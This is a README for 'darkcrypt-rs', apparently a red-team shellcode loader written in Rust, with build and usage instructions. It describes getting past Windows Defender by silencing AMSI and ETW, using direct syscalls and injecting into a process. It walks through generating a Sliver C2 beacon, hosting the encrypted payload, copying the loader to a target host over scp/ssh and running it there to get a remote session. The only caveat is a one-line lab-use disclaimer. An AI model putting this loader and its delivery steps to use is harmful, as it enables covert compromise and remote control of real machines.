<div align="center">

# darkcrypt-rs

**Rust port of darkcrypt — `#![no_std]` + `#![no_main]`, cross-compiled from Linux via mingw-w64. Direct syscalls, HWBP AMSI/ETW silencing, runtime-loaded WinHTTP. Runs clean on Win11 24H2 under Defender RTP.**

</div>

---

> ⚠️ Authorized lab use only (snapshot VMs, HTB, Vulnlab). You own your use.

## What it does

Fetches an AES-256-CBC + HMAC-SHA256 payload (DCP1 wire format) over WinHTTP, decrypts it in memory with pure-Rust crypto (no `bcrypt.dll`), spawns a suspended `notepad.exe`, and dispatches the shellcode through a persistent RWX syscall trampoline (Halos Gate). Loader-side AMSI + ETW are silenced with vectored-handler hardware breakpoints; a third APC re-arms DR0 inside the beacon host.

`winhttp.dll` is loaded at runtime via hash-resolved `LoadLibraryW` and all eight `WinHttp*` entry points come out of the shared DJB2 export cache, so the PE import table still lists `KERNEL32.dll` and nothing else.

**37.8 KB PE, 8 imported names, 1 IOC finding (SHA-256 IV constants — RFC-6234 baseline).**

## Build

Cross-compile from Linux:

```bash
rustup target add x86_64-pc-windows-gnu
# plus x86_64-w64-mingw32-gcc from your package manager
./scripts/build.sh                # drops artifacts/darkcrypt-rs.exe
```

Or native on an x64 Windows host: `.\scripts\build.ps1`.

IOC gate:

```bash
python3 tools/check_iocs.py artifacts/darkcrypt-rs.exe
# expected: 1 finding (SHA-256 IV constants, accepted baseline)
```

## Usage

1. **Forge the payload** (reuses darkcrypt C's encoder — same wire format):
   ```bash
   sliver > generate --mtls <c2>:8443 --os windows --arch amd64 --format shellcode \
                     --save /tmp/beacon.bin --shellcode-exitopt 3 --shellcode-entropy 3 --skip-symbols
   ../darkcrypt/forge.sh /tmp/beacon.bin    # writes aes.encrypted + prints fresh keys
   ```
2. **Bake** the printed keys into `AES_KEY` / `MAC_KEY` in `src/main.rs`, and re-encode your fetch URL into `ENC_C2_URL` / `KEY_C2_URL` in `src/encoded_strings.rs` via `tools/xor_encode.py --mb-key-random 6 "<url>"`. Rebuild, re-gate.
3. **Host the blob + open the listener:**
   ```bash
   python3 -m http.server 8080 --directory .   # serves aes.encrypted at /aes.encrypted
   sliver > mtls -L 0.0.0.0 -l 8443
   ```
4. **Deliver + fire** — HTTP pull (default) or disk drop:
   ```bash
   # HTTP pull (no arg; loader fetches the baked C2 URL)
   scp artifacts/darkcrypt-rs.exe user@target:C:/Users/user/darkcrypt-rs.exe
   ssh user@target 'C:\Users\user\darkcrypt-rs.exe'

   # Disk drop (pass the blob path)
   scp aes.encrypted              user@target:C:/Users/user/dc_payload.bin
   ssh user@target 'C:\Users\user\darkcrypt-rs.exe C:\Users\user\dc_payload.bin'
   ```
   Session lands on Sliver in ~1-2 seconds either way.

## Exit codes

```
0            PASS
1-9          per-stage failure (peb / halos / etw / amsi / syscall smoke / read / decrypt / inject / http)
0xDEADBEEF   panic
```

## Notes

- `notepad.exe` is the only reliable host — `RuntimeBroker.exe` dies in ~5 s.
- The 1000 ms `io::sleep` between `ResumeThread` and `finish_amsi` is load-bearing. Never remove it.
- Never export `RUSTFLAGS` when building — it replaces `[target.*].rustflags`. PE link args are in `build.rs` as `cargo:rustc-link-arg=` so they survive; the rest of `config.toml` doesn't.
- Dev profile must `panic = "abort"` (already set) — else `cargo build` drags in `libgcc_eh`.
- Start every run from a clean snapshot.

## Cross-port

| Build          | Size    | Imports                | IOC | Win11 24H2 Defender |
|----------------|---------|------------------------|-----|---------------------|
| darkcrypt (C)  | 62 KB   | kernel32, ntdll        | 0   | ✓                   |
| darkcrypt-cs   | 37 KB   | n/a (.NET)             | n/a | ✓                   |
| darkcrypt-rs   | 37.8 KB | KERNEL32 only, 8 names | 1   | ✓                   |
